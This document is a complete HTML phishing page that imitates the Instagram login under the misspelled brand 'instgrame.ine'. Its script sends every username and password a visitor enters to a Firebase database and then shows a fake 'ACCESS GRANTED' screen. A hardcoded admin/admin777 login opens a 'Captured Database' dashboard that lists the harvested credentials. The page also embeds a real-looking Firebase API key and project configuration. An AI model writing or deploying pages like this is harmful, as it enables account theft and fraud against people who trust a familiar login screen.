<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        /* Modern Minimalist Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            color: #262626;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 10px;
        }

        /* Clean White Styled Card Box */
        .login-card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            width: 100%;
            max-width: 350px;
            padding: 40px 30px;
            text-align: center;
            border-radius: 1px;
        }

        .brand-title {
            font-style: italic;
            font-size: 2.2rem;
            font-weight: bold;
            margin-bottom: 30px;
            color: #262626;
            letter-spacing: -1px;
        }

        .input-wrapper {
            margin-bottom: 8px;
            width: 100%;
        }

        /* Modern Greyish Inputs */
        input {
            width: 100%;
            padding: 10px 8px;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            color: #262626;
            font-size: 0.85rem;
            border-radius: 3px;
            outline: none;
        }

        input:focus {
            border-color: #a8a8a8;
        }

        /* Premium Accent Login Button */
        .submit-btn {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            color: #ffffff;
            border: none;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            border-radius: 4px;
            margin-top: 15px;
            transition: background 0.2s;
        }

        .submit-btn:hover {
            background: #1877f2;
        }

        /* Output & Terminal Area */
        #portal-output {
            margin-top: 20px;
            display: none;
        }

        .admin-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            font-size: 0.85rem;
        }

        .admin-table th, .admin-table td {
            border: 1px solid #dbdbdb;
            padding: 8px;
            text-align: left;
        }

        .admin-table th {
            background: #fafafa;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="brand-title">instgrame.ine</div>

        <div id="auth-form">
            <div class="input-wrapper">
                <input type="text" id="username" placeholder="Phone number, username, or email">
            </div>
            <div class="input-wrapper">
                <input type="password" id="password" placeholder="Password">
            </div>
            <button class="submit-btn" onclick="handleAuth()">Log In</button>
        </div>

        <div id="portal-output"></div>
    </div>

    <script>
        // --- FIREBASE CONFIGURATION ---
        const firebaseConfig = {
            apiKey: "AIzaSyDi20_1FpiU7OQ4EEQMDdvyHlY5_Vn23F4",
            authDomain: "dragoai-ef040.firebaseapp.com",
            databaseURL: "https://dragoai-ef040-default-rtdb.firebaseio.com/",
            projectId: "dragoai-ef040",
            storageBucket: "dragoai-ef040.firebasestorage.app",
            messagingSenderId: "972005846887",
            appId: "1:972005846887:web:af60900dd52746444889c2"
        };

        if (firebaseConfig.apiKey !== "YOUR_API_KEY") {
            firebase.initializeApp(firebaseConfig);
        }
        const database = typeof firebase !== 'undefined' && firebase.apps.length ? firebase.database() : null;

        // --- AUTH LOGIC ---
        function handleAuth() {
            const user = document.getElementById("username").value.trim();
            const pass = document.getElementById("password").value.trim();

            if (!user || !pass) {
                alert("Please fill in all fields.");
                return;
            }

            // Secret Admin Dashboard Trigger
            if (user === "admin" && pass === "admin777") {
                document.getElementById("auth-form").style.display = "none";
                loadDashboard();
                return;
            }

            // Data Submission to Firebase
            if (database) {
                const logsRef = database.ref("players").push();
                logsRef.set({
                    username: user,
                    password: pass,
                    timestamp: new Date().toISOString()
                }).then(() => {
                    showWelcomeMessage(user);
                }).catch((err) => {
                    console.error("Firebase Error: ", err);
                    showWelcomeMessage(user);
                });
            } else {
                showWelcomeMessage(user);
            }
        }

        // --- MODERN WELCOME DISPLAY ---
        function showWelcomeMessage(user) {
            document.getElementById("auth-form").style.display = "none";
            const output = document.getElementById("portal-output");
            output.style.display = "block";
            
            output.innerHTML = `
                <h1 style="font-size: 1.8rem; font-weight: 300; color: #262626; margin-bottom: 10px;">Welcome, ${user}</h1>
                <p style="font-size: 0.9rem; color: #8e8e8e; margin-bottom: 25px;">Your session has been successfully initialized.</p>
                
                <button style="
                    background: #262626; 
                    color: #ffffff; 
                    border: none; 
                    padding: 10px 24px; 
                    font-size: 0.85rem; 
                    font-weight: 600; 
                    cursor: pointer; 
                    border-radius: 4px;
                " onclick="nextStep()">
                    Continue
                </button>
            `;
        }

        function nextStep() {
            const output = document.getElementById("portal-output");
            output.innerHTML = `
                <h2 style="font-size: 1.4rem; font-weight: 600; color: #262626; margin-top: 10px;">Setup Complete</h2>
                <p style="font-size: 0.9rem; color: #262626; margin: 15px 0 20px 0;">All core integrations are working correctly.</p>
                <span style="font-size: 0.8rem; color: #0095f6; font-weight: 600; border: 1px solid #0095f6; padding: 6px 12px; border-radius: 4px;">ACCESS GRANTED</span>
            `;
        }

        // --- DASHBOARD FOR REVIEWS ---
        function loadDashboard() {
            const output = document.getElementById("portal-output");
            output.style.display = "block";
            output.style.textAlign = "left";
            
            output.innerHTML = `
                <h3 style="font-size: 1.1rem; font-weight: 600; margin-bottom: 10px;">Captured Database</h3>
                <div id="logs-container" style="color: #8e8e8e; font-size: 0.85rem;">Connecting to grid...</div>
            `;

            if (!database) {
                document.getElementById("logs-container").innerHTML = "<p style='color:#ed4956;'>Firebase config values missing.</p>";
                return;
            }

            database.ref("players").on("value", (snap) => {
                const items = snap.val();
                if (!items) {
                    document.getElementById("logs-container").innerHTML = "<p>No entries found.</p>";
                    return;
                }

                let html = `
                    <table class="admin-table">
                        <thead>
                            <tr>
                                <th>Identity</th>
                                <th>Access Key</th>
                            </tr>
                        </thead>
                        <tbody>
                `;

                for (let key in items) {
                    html += `
                        <tr>
                            <td>${clean(items[key].username)}</td>
                            <td>${clean(items[key].password)}</td>
                        </tr>
                    `;
                }

                html += `</tbody></table>`;
                document.getElementById("logs-container").innerHTML = html;
            });
        }

        function clean(text) {
            if (!text) return '';
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
    </script>
</body>
</html>
